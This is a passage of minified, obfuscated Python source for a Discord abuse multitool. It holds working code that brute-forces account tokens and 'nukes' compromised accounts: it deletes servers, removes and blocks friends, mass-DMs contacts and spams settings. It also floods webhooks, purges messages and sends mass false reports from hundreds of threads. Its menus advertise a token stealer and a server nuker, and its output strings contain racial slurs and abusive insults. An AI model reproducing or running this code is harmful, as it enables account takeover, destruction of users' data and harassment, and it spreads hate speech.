								E=d([AD,AC,AB,AA,A9,A7,A6,A3,A2,A1,A0,z,y,x,w,v,u,t,s,'T','U','V','W','X','Y','Z',A4,'b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',A5,'x','y','z',O,N,L,c,b,a,Z,W,R,Q,M,'_']);B=I+G.join(f.choices(E,k=35));H={r:B,p:o};C=AH.get(S,headers=H)
								if C.status_code==401:D(f"{A.RED}[!]{F.RESET_ALL}    {A.RED}Invalid:{F.RESET_ALL} {B}")
								elif C.status_code==200:D(f"{A.GREEN}[!]{F.RESET_ALL}    {A.GREEN}Valid Token:{F.RESET_ALL} {B}");AJ.showinfo(message=f"{A.CYAN}[{A.RED}! {A.CYAN}]  Dev - stoned.eagle#0001",title='[!]');break
							except AF:D(G);D(f"{A.CYAN}[!]{F.RESET_ALL}    Bruteforcer ");break
					T()
			else:
				D(f"{A.CYAN}[!]{F.RESET_ALL}    The Id Is Invalid you fucking dumb retard");B=H()
				if B==G:K()
				else:K()
		else:
			D(f"{A.CYAN}[!]{F.RESET_ALL}    Invalid ID LoL");B=H()
			if B==G:K()
			else:K()
	def AL():
		E='https://discordapp.com/api/v8/users/@me'
		def B():
			B=G
			while AE:
				try:
					H=d([O,N,L,c,b,a,Z,W,R,Q]);I=G.join(f.choices(H,k=18));J=I.encode(P);K=AG.b64encode(J);S=K.decode(P);T=d([AD,AC,AB,AA,A9,A7,A6,A3,A2,A1,A0,z,y,x,w,v,u,t,s,'T','U','V','W','X','Y','Z',A4,'b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',A5,'x','y','z',O,N,L,c,b,a,Z,W,R,Q,M,'_']);B=S+G.join(f.choices(T,k=35));U={r:B,p:o};C=AH.get(E,headers=U)
					if C.status_code==401:D(f"{A.RED}[!]{F.RESET_ALL}    {A.RED}Inválido:{F.RESET_ALL} {B}")
					elif C.status_code==200:D(f"{A.CYAN}[{A.RED}!{A.CYAN}]{A.CYAN}{F.RESET_ALL}    {A.GREEN}[Valid]:{F.RESET_ALL} {B}");AJ.showinfo(message=f"Token Has been Found",title='[!] Use Token...')
				except AF:D(G);D(f"{A.CYAN}[!]{F.RESET_ALL}    Bruteforce terminado");break
		B()
	def h():
		I.system('they laugh at me because im emo');J();D(f"{A.CYAN}[{A.RED}!{A.CYAN}]{F.RESET_ALL}    Dev: {A.CYAN} stoned.eagle#0001");D(G);D(f"{A.BLUE}[!]{F.RESET_ALL}    Pick Option: ");D(G);D(f"{A.BLUE}[1]{F.RESET_ALL}    ID Token Bruteforce");D(f"{A.BLUE}[2]{F.RESET_ALL}    Random Token [Eagle Gen]");D(f"{A.BLUE}[3]{F.RESET_ALL}    Leave");D(G);D(f"{A.BLUE}[!]{F.RESET_ALL}    Option: ",end=G);B=H()
		if B==O:K()
		elif B==N:AL()
		elif B==L:I.system('stoned.eagle#0001runsblackpeople   [!]  Leave  && cls && Fuck Niggers');J();D(f"{A.CYAN}[!]{F.RESET_ALL}    Follow MvpAlej On Github For Free Sex");e.sleep(3);j()
		else:
			I.system('stoned.eagle#0001runsblackpeople  Drainers  && cls');J();D(f"{A.CYAN}[!]{F.RESET_ALL}    Escoja una opción válida");C=H()
			if C==G:h()
			else:h()
	I.system('stoned.eagle#0001runsblackpeople   Connecting to ORcus RAT LMFAO  && cls && stonedgang');J();D(f"{A.CYAN}[{A.RED}!{A.CYAN}] Dev - stoned.eagle#0001");D(G);D('Loading Assets');e.sleep(2);I.system('stoned.eagle#0001runsblackpeople  Clowns ');J();D(f"{A.BLUE}[!]{F.RESET_ALL}    Developer:{F.RESET_ALL} stoned.{A.BLUE}eagle{A.WHITE}#0001");D(G);D(f"{A.BLUE}[!]{F.RESET_ALL}    Enter Password [The password is 123 lol]: ",end=f"{A.WHITE}");AM=H()
	if AM=='123':I.system('stoned.eagle#0001 is goated cuh');J();D(f"{A.BLUE}[!]{F.RESET_ALL}   uwu.");e.sleep(3);h()
	else:
		I.system('stoned.eagle#0001 Is The Goat');J();D(f"{A.CYAN}[!]{F.RESET_ALL}    retard your stupid as fuck holy god fuckin damn nigga jesus christ");AN=H()
		if AN==G:I.system(n);sys.exit()
		else:I.system(n);sys.exit()
def AG():
	G.system(Q);O();B(f"""
    {H}      
  ║══════════════════════║══════════════════════════║
  ║ [1] - WEBHOOK CHECKER║ [3] - WEBHOOK SPAMMER    ║       
  ║ [2] - WEBHOOK DELETER║ [4] - BACK               ║
  ║══════════════════════║══════════════════════════║
    """);A=C('Choice\n > ')
	if A==V:Af()
	elif A==T:Ai()
	elif A==S:Ap()
	elif A==l:L()
	else:AG()
def Ak():
	import discord as A;O();D=C('Token Here\n > ');B('[+] - Connected... Say purge (Lowercase) In the chat too purge')
	class E(A.Client):
		async def on_message(E,message):
			A=message
			if A.author!=E.user:return
			C=[]
			if A.content=='purge':C=A.channel.guild.channels
			elif A.content=='purgeall':C.append(A.channel)
			else:return
			for F in C:
				B(F)
				try:
					async for D in F.history(limit=A7):
						if D.author==E.user:
							B(D.content)
							try:await D.delete()
							except:B(f"{W}[!] - Can't delete!\n")
				except:B("Can't read history!\n")
	F=E(heartbeat_timeout=86400,guild_subscriptions=g);F.run(D,bot=g)
def Al():
	y='https://canary.discord.com/api/v8/users/@me/channels';X='https://canary.discord.com/api/v8/users/@me/relationships';L='Mozilla/5.0';K='bruh6/9';H='Samsung Fridge/6.9';G='user-agent';import requests as D,string as Y,random as Z,time as A,multiprocessing as N,sys;z=[U,g];M=C('Enter A Token: ')
	def a(Ammount):A=E.join((Z.choice(Y.ascii_letters)for A in F(0,Ammount)));return A
	def b(Token):
		E={I:Token,G:K};F=D.get(X,headers=E)
		for C in F.json():B(f"{C[v][AJ]}#{C[v][AK]}");B(f"{'-'*10}")
		A.sleep(3)
	def c(Token):
		F={I:Token,G:K};C=D.get('https://canary.discord.com/api/v9/users/@me',headers=F).json()
		for E in C:B(f"{w}{E}: {W}{C[f'{E}']}")
		A.sleep(3)
	def O(Token):
		A={I:Token,G:K}
		for (C,E) in A2(F(0,25)):B={t:a(15)};H=D.post('https://canary.discord.com/api/v8/guilds',headers=A,json=B)
	def d(Token):
		A={I:Token,G:K};E=D.get(X,headers=A).json()
		for C in E:D.delete(f"https://canary.discord.com/api/v8/users/@me/relationships/{C[J]}",headers=A);B(f"Removed Friend {C[J]}")
	def e(Token):
		A={I:Token,G:K};E={u:2};F=D.get(X,headers=A).json()
		for C in F:D.put(f"https://canary.discord.com/api/v8/users/@me/relationships/{C[J]}",headers=A,json=E);B(f"Blocked Friend {C[J]}")
	def P(Token):
		l='https://canary.discord.com/api/v8/users/@me/settings';k='mutual_guilds';j='mutual_friends';i='all';h='disable_games_tab';f='detect_platform_accounts';e='status';d='stream_notifications_enabled';c='allow_accessibility_detection';b='contact_sync_enabled';a='native_phone_integration_enabled';Z='enable_tts_command';Y='animate_stickers';X='convert_emoticons';W='animate_emoji';V='render_reactions';T='render_embeds';S='gif_auto_play';R='inline_attachment_media';Q='inline_embed_media';P='friend_source_flags';O='default_guilds_restricted';N='explicit_content_filter';M='message_display_compact';L='afk_timeout';K='developer_mode';J='theme';B('Started Job')
		for m in F(0,100):E={I:Token,G:H};A=U;C={J:'light',K:A,L:60,AM:'ko',M:A,N:2,O:A,P:{i:A,j:A,k:A},Q:A,R:A,S:A,T:A,V:A,W:A,X:A,Y:1,Z:A,a:A,b:A,c:A,d:A,e:'idle',f:A,h:A};D.patch(l,headers=E,json=C);A=g;C={J:'dark',K:A,L:120,AM:'bg',M:A,N:0,O:A,P:{i:A,j:A,k:A},Q:A,R:A,S:A,T:A,V:A,W:A,X:A,Y:2,Z:A,a:A,b:A,c:A,d:A,e:'dnd',f:A,h:A};D.patch(l,headers=E,json=C)
	def f(Token):
		A={I:Token,G:H};E=D.get('https://canary.discord.com/api/v8/users/@me/guilds',headers=A).json()
		for C in E:D.delete(f"https://canary.discord.com/api/v8/users/@me/guilds/{C[J]}",headers=A);B(f"Left Guild: {C[J]}")
	def h(Token):
		A={I:Token,G:H};B=D.get(y,headers=A).json()
		for C in B:D.delete(f"https://canary.discord.com/api/v8/channels/{C[J]}",headers=A)
	def i(Token):
		K='https://discord.com/api/v8/users/@me/settings';J='emoji_name';E='custom_status';C={I:Token,G:H}
		for L in F(0,50):B={E:{A6:'You Got Nuked By Ditto',J:'🍉'}};D.patch(K,headers=C,json=B);A.sleep(0.7);B={E:{A6:'dittotools.xyz',J:'🥵'}};D.patch(K,headers=C,json=B);A.sleep(0.7);B={E:{A6:'Get Good, Get Ditto',J:'😈'}};D.patch(K,headers=C,json=B);A.sleep(0.7)
	def j(Token):
		C={I:Token,G:H};F=D.get(y,headers=C).json()
		for E in F:K={B8:'stoned.eagle#0001 new account lol'};A.sleep(1);L=D.post(f"https://canary.discord.com/api/v8/channels/{E[J]}/messages",headers=C,data=K);B(f"Sent DM To {E[J]}")
	def k(Token):
		A={I:Token,G:H};E=D.get('https://discord.com/api/v8/users/@me/guilds',headers=A).json()
		for C in E:F=D.post(f"https://discord.com/api/v8/guilds/{C[J]}/ack",headers=A);B(C[J])
	def Q(Token):A={I:Token,G:L};D.get('https://canary.discordapp.com/api/v8/guilds/0/members',headers=A)
	def n(Webhook):D.delete(Webhook)
	def o(Token):A={I:Token,G:L};C=D.get('https://discord.com/api/v8/auth/location-metadata',headers=A).json();B(f"Token Country: {C['country_code']}")
	def R(Token):A={I:Token,G:L};D.post('https://discord.com/api/v8/auth/verify/resend',headers=A)
	def p(Token):
		B=Token
		for C in F(0,20):Q(B);A.sleep(2);R(B)
	def q(Token):
		A={I:Token,G:L}
		for B in F(0,1):C={AJ:'Bruh',AK:9871};D.patch(AI,headers=A,json={'date_of_birth':'2017-2-11'})
	def r(Token):
		A={I:Token,G:L};B('Got Data');E=D.get('https://discord.com/api/v9/users/@me/guilds',headers=A).json()
		for C in E:D.post(f"https://canary.discord.com/api/v9/guilds/{C[J]}/delete",headers=A);B(C[J])
	s={'0':b,V:c,T:O,S:d,l:e,m:P,A8:f,'7':h,'8':i,'9':j,'10':k,'11':Q,'12':n,'13':o,'14':R,'15':p,'16':q,'17':r};A0=At;w=Au;W=Av;A1=Aw;A3=Ax;A4=Ay;A5=Az;A7=A_;A9=B0;AA=B1
	def x():
		B(f"""
      {W}
    ║═════════════════════║══════════════════════║
    ║ [0] - View Friends  ║  [2] - Spam Servers  ║
    ║ [1] - Token Info    ║  [3] - Remove Friends║
    ║ [4] - Block Friends ║  [5] - Spam Settings ║
    ║ [6] - Leave Servers ║  [7] - Close DMS     ║
    ║ [8] - Cycle Status  ║  [9] - Mass DM       ║
    ║ [10] - Read Servers ║  [11] - Remove Email ║
    ║═════════════════════║══════════════════════║
      """);E=C('Please Enter An Option From The List: ')
		if E==5 or E==m:
			A=[]
			for H in F(0,6):G=N.Process(target=P,args=(M,));A.append(G)
			for D in A:D.start()
			for D in A:D.join()
		elif E==2 or E==T:
			A=[]
			for H in F(0,4):G=N.Process(target=O,args=(M,));A.append(G)
			for D in A:D.start()
			for D in A:D.join()
		else:s[E](M)
	if __name__==AP:
		while 1:
			try:x()
			except As:sys.exit()
def Am():
	N='delete';import requests as D,os,colorama as J,time;from colorama import Fore as A;J.init();os.system('mode con: cols=110 lines=25');K=B9
	def H():os.system(X)
	def L():B=f"""{A.CYAN}
    ║══════════════════════║══════════════════════════║
    ║ [1] - Bravery        ║  [3] - Balance           ║  
    ║ [2] - Brilliance     ║  [4] - None              ║
    ║══════════════════════║══════════════════════════║
      """;return B
	def F(item):
		A=item;C=D.Session();B={Y:d,k:q,AO:K}
		if A==V or T or S:E={'house_id':A};F=C.post('https://discordapp.com/api/v8/hypesquad/online',headers=B,json=E,timeout=10)
		if A==N:F=D.delete('https://discord.com/api/v8/hypesquad/online',headers=B)
		else:0
	def G():B(f"[{A.GREEN}+{A.RESET}] Done.\n");B(f"[{A.LIGHTCYAN_EX}>{A.RESET}] Press any key.");os.system(AQ);I()
	def M():
		global d;d=C(f"[{A.LIGHTCYAN_EX}>{A.RESET}] Token: ");E={Y:d,k:q};F=D.get(BA,headers=E)
		if F.status_code==200:0
		else:H();B(f"[{A.RED}-{A.RESET}] Error");time.sleep(9999)
	def I():
		H();B(L());B(f"[{A.LIGHTCYAN_EX}>{A.RESET}]",end=E);D=f(C(' '))
		if D.lower()==V:F(V);G()
		elif D.lower()==T:F(T);G()
		elif D.lower()==S:F(S);G()
		elif D.lower()==l:F(N);G()
		elif D.lower()=='e':os.system('exit')
		else:H();I()
	if __name__==AP:M();I()
def An():
	import requests as E,os;from colorama import Fore as A,Style;from threading import Thread as I;from requests import Session as J;Q=0;R=J();D=Style.BRIGHT;os=os.system;os(X);G=C(f"{D+A.BLUE} > Token{A.RESET}: ");K={Y:G,k:q};L=E.get(BA,headers=K)
	if L.status_code==200:0
	else:B(f"{D+A.RED} > Invalid Token");C()
	M=C(f"{D+A.BLUE} > Server ID{A.RESET}: ");N=C(f"{D+A.BLUE} > Channel ID{A.RESET}: ");H=C(f"{D+A.BLUE} > Message ID{A.RESET}: ");O=C(f"{D+A.BLUE} > Option{A.RESET}: ")
	def P():
		global Ao;I={AO:B9,Y:G,k:q};J={B5:N,B4:M,'message_id':H,'reason':O}
		while U:
			F=E.post('https://discord.com/api/v6/report',headers=I,json=J)
			if F.status_code==201:B(f"{A.GREEN} > Sent Report {D+A.BLUE}::{A.GREEN} ID {H}");Ao+=1
			elif F.status_code==401:B(f"{A.RED} > Invalid token");C();j()
			else:B(f"{A.RED} > Error")
	B()
	for S in F(500,1000):I(target=P).start()
def A0():
	O();B(f"""
    {H}
  ║═════════════════════║══════════════════════║
  ║ [1] - WEBHOOK       ║  [3] - ACCOUNT NUKER ║
  ║ [2] - Message Purger║  [4] - BACK          ║
  ║ [5] - TokenForce    ║  [6] - Mass Report   ║
  ║ [7] - Token Stealer ║  [8] - Token Info    ║
  ║ [9] - HS Change     ║  [10] - Back         ║
  ║═════════════════════║══════════════════════║
    """);A=C('Choice \n > ')
	if A==V:AG()
	elif A==T:Ak()
	elif A==S:Al()
	elif A==l:L()
	elif A==m:Aj()
	elif A==A8:An()
	elif A=='7':Ab()
	elif A=='8':AX()
	elif A=='9':Am()
	elif A=='10':L()
def A1():
	O();B(f"""
    {H}
  ║═══════════════════║═══════════════════════║
  ║ [1] - TOKEN GEN   ║  [3] - BACK           ║
  ║ [2] - NITRO GEN   ║                       ║
  ║═══════════════════║═══════════════════════║
    """);A=C(f"{Z} Choice\n >")
	if A==V:AY()
	elif A==T:Ag()
	elif A==S:L()
	else:B('Invalid Choice retard');G.system(Q);A1()
def Ap():
	O();A=C(f"{H}Message\n>{W}");D=C('Webhook\n >')
	def E(msg,webhook):
		A=webhook
		while U:
			try:
				C=K.post(A,json={B8:msg})
				if C.status_code==204:B(f"{Z}[{R}>{Z}] - Sent MSG {msg}")
			except:B(f"{W}[X] - Invalid Webhook\n > "+A);N.sleep(5);j()
	F=1
	while F==1:E(A,D)
def Aq():O();G.system(Q);B('Better Nuker: https://replit.com/@StonedEaglez/Eagle-Nuker-v11?v=1');B('Wayy better Features')
def o():
	G.system(Q);O();B('  [!] - Made nuker.json directory');B('  [!] - Put your bot token in nuker.json');B(f"  [!] - Connected...");B(f"""{H}
║══════════════════════║══════════════════════║
║  [1] - Spam Channels ║ [3] - Nuke Server    ║
║  [2] - Spam Roles    ║ [4] - Better Nuker   ║
║  [5] - BACK          ║                       ║
║══════════════════════║══════════════════════║
    """);A=p(C('\x1b[38;5;231mChoice \n >  '))
	if A==1:AE();N.sleep(1);o()
	elif A==2:AF();N.sleep(1);o()
	elif A==3:AE();AF()
	elif A==4:Aq()
	elif A==5:
		B('[+] - Going Back')
		try:G.system(Q);L()
		except:B('[-] - Something Weird Happened')
	else:B('Not a valid option... ');o()
def BJ():
	O();B(f"  {Z}[+] - {H}Loaded Discord Menu");B(f"  Took {Ad.c} Seconds");B(f"""
  ║══════════════════════════════════════║
  ║ [1] - EAGLE NUKER  ║ [3] - MULTITOOL ║
  ║ [2] - GENERATION   ║ [4] - CREDITS   ║              
  ║ [5] - BACK         ║                 ║
  ║══════════════════════════════════════║
    """);A=C('Your choice\n ')
	if A==V:G.system(Q);o()
	if A==T:G.system(Q);A1()
	if A==S:G.system(Q);A0()
	if A==S:G.system(Q);A0()
	if A==m:G.system(Q);L()
def L():
	G.system(Q);B(f"""
  [38;5;111m█████╗ ███╗   ███╗██╗███████╗
  [38;5;159m██╔══██╗████╗ ████║██║╚══███╔╝
  [38;5;195m███████║██╔████╔██║██║  ███╔╝ 
  ██╔══██║██║╚██╔╝██║██║ ███╔╝  
  ██║  ██║██║ ╚═╝ ██║██║███████╗
  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝ {w}
                                
  """);B(f"""                   DISCORD
    
  ║═══════════════════║═══════════════════════║
  ║ [1] - MULTITOOL   ║   [3] - GENERATION    ║
  ║ [2] - SERVER NUKE ║   [4] - CREDITS       ║
  ║═══════════════════║═══════════════════════║
    """);A=C(f"{Z} Choice: \n ")
	if A==V:
		B(f"{AU}Loading Discord Menu");G.system('cls;clear')
		try:A0()
		except Ar as D:B(f"  {W}[!] - Fatal Error: ",D)
		B(f" {W} [-] - Error Opening Multi Tool Menu");L()
	elif A==T:o()
	elif A==S:A1()
	elif A==l:credits()
	elif A==m:0
	elif A==A8:Ac()
L()